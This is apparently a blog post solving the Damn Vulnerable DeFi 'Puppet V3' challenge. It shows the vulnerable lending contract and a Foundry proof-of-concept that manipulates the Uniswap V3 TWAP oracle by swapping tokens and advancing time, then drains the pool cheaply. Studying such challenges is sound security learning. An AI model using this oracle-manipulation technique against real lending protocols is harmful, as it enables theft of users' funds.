---
title: Damn Vulnerably DeFi - Puppet V3 Solution 
date: "2023-03-21T23:46:37.121Z"
---
My solution for the challenge Puppet V3 & understanding **Uniswap V3** prices on a time weight average.

**First, lets discuss the key points to understand how to break this challenge:**

This challenge introduced Uniswap v3 prices calculation and how it now tracks prices at the end of a block, after the last trade of a block. This removes the possibility of in-block price manipulations, (flashloan attacks) ;). And it does this by tracking observations, basically the last price event info.

Note: this challenge was a nice opportunity to contribute to the [Foundry version of the Damn Vulnerable Defi challenges](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry) originally created by the Open Zeppelin team. I have proposed my update to add this challenge in Foundry.
<br>
[<img src="./uniswapv3-devBook.png">](https://uniswapv3book.com/)

- Observations are slots that stores a recorded prices, timestamp, and activation flag.
- Cardinality, number of activated observations.
- TWAP are used mainly to support calculation of prices in periods where there were no observations.

## Puppet v3

[<img src="./puppetv3.png">](https://www.damnvulnerabledefi.xyz/challenges/puppet-v3/)


**Now Let's take at the victim contract**
We have a pool where users can borrow its Token in exchange for providing 3 times WETH, the pool uses uniswapV3 TWA to fetch and calculate the token price with respect to eth based on the last observation.
`````
pragma solidity =0.7.6;

contract PuppetV3Pool {
    uint256 public constant DEPOSIT_FACTOR = 3;
    uint32 public constant TWAP_PERIOD = 10 minutes;

    IERC20Minimal public immutable weth;
    IERC20Minimal public immutable token;
    IUniswapV3Pool public immutable uniswapV3Pool;

    mapping(address => uint256) public deposits;

    event Borrowed(address indexed borrower, uint256 depositAmount, uint256 borrowAmount);

    constructor(IERC20Minimal _weth, IERC20Minimal _token, IUniswapV3Pool _uniswapV3Pool) {
        weth = _weth;
        token = _token;
        uniswapV3Pool = _uniswapV3Pool;
    }

    /**
     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH.
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and the borrowed token have the same number of decimals.
     * @param borrowAmount amount of tokens the user intends to borrow
     */
    function borrow(uint256 borrowAmount) external {
        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);

        // Pull the WETH
        weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        TransferHelper.safeTransfer(address(token), msg.sender, borrowAmount);

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount);
    }

    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
        uint256 quote = _getOracleQuote(_toUint128(amount));
        return quote * DEPOSIT_FACTOR;
    }

    function _getOracleQuote(uint128 amount) private view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(uniswapV3Pool), TWAP_PERIOD);
        return OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            amount, // baseAmount
            address(token), // baseToken
            address(weth) // quoteToken
        );
    }

    function _toUint128(uint256 amount) private pure returns (uint128 n) {
        require(amount == (n = uint128(amount)));
    }
}
`````
**Validation Constraints**
- Block timestamp must not have changed too much, no more than 115 sec.
- Player has taken all tokens out of the pool


**Attack Brainstorm**

- Right away I saw the pragma version and think on overflow/underflow anything, but not so fast Tincho has protected well even its numbers down-casting with the last function of the contract.
- The borrow function seems simple and updates correctly before transfer out, so I won't spend much time trying to game this one.
- I see the hardcoded **TWA time 10** and seems suspicious to me, docs: `Number of seconds in the past to start calculating the time-weighted observation`
- Then the required eth calculation function is using the oracle, if we can someway get the oracle to return a very cheap price, the ETH can drain easily.
    - So we take a look at user inputs for these one and maybe the passing `type(uint256).max` can reset the price to zero. But the oracle will revert on underflow, so not here... :(
- Now, we could swap all of our DVT token for as much WETH token as possible
    - this swap will lower the pool's WETH reserves in comparison to the DVT, but the oracle is protected against same block manipulations, so we need another transaction that will use this last **observation** of the price.
    - Now, I remember that on the book it's mentioned that anyone can change the next cardinality of the observations, and since we know in this case we are the only ones trading in this pool, we might as well set the cardinality to take the next time only 2 observations.
    - `uniswapPool.increaseObservationCardinalityNext(2)` at the beginning of the challenge setUp we see that Tincho set this to 40 after init the pool.
    - If this works, we could bypass the TWA at which the contracts pull it's prices. So we must do a set of transactions within 10 minutes, or in other words we will simulate short-term volatility.
    - Ideally we could `warp` the vm or (increase block timestamp) with foundry to swap and fast forward within the next 100 sec, so the oracle will pick the last observation which left the price of the token at a very discount rate.


### POC Solution

For the complete set up and solution code please refer to my foundry repo [here](https://github.com/danielles0xG/damn-vulnerable-defi-foundry/blob/master/test/Levels/puppet-v3/PuppetV3.t.sol).
````
  function testExploit() public {
       
        // Swap all out dvt for as much weth possible
        dvt.approve(address(uniswapRouterAddress), type(uint256).max);
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(dvt),
                address(weth),
                3000,
                address(attacker),
                block.timestamp,
                ATTACKER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
                0,
                0
            )
        );

        // fast forward 100 seconds
        vm.warp(block.timestamp + 100);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);

        // Drain the pool
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        validation();
    }
````
Note that if we don't increase the timestamp the observation will remain in the first slot, meaning the 3x ratio price.

````
        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("quote: ", quote1); //   quote:  3000000000000000000000000

        vm.warp(block.timestamp + 100);

        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("quote: ", quote); //    quote: 1135374091135900626
````

**Thanks and I hope you find value in this post.**

